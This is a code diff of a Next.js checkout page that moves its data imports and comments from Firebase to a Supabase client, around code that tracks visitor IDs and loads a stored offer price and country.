@@ -18,8 +18,8 @@ import { StepShell } from "@/components/step-shell";
 import P1 from "@/components/form-a";
 import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
-import { addData, db } from "@/lib/firebase";
-import { doc, getDoc, onSnapshot, Firestore } from "firebase/firestore";
+import { addData, db } from "@/lib/supabase-client";
+import { doc, getDoc, onSnapshot, Firestore } from "@/lib/supabase-client";
 
 export default function CheckPage() {
   const router = useRouter();
@@ -101,7 +101,7 @@ export default function CheckPage() {
         /* ignore */
       }
 
-      // Load selected offer from Firebase
+      // Load selected offer from Supabase
       if (!db) return;
       const docRef = doc(db as Firestore, "pays", visitorID);
       const docSnap = await getDoc(docRef);
@@ -115,13 +115,13 @@ export default function CheckPage() {
           setOfferTotalPrice(data.offerTotalPrice);
         }
 
-        // Save country to localStorage if it exists in Firebase
+        // Save country to localStorage if it exists in Supabase
         if (data.country && !localStorage.getItem("country")) {
           localStorage.setItem("country", data.country);
         }
       }
 
-      // If country not in Firebase or localStorage, fetch it
+      // If country not in Supabase or localStorage, fetch it
       if (!localStorage.getItem("country")) {
         try {
           const APIKEY =
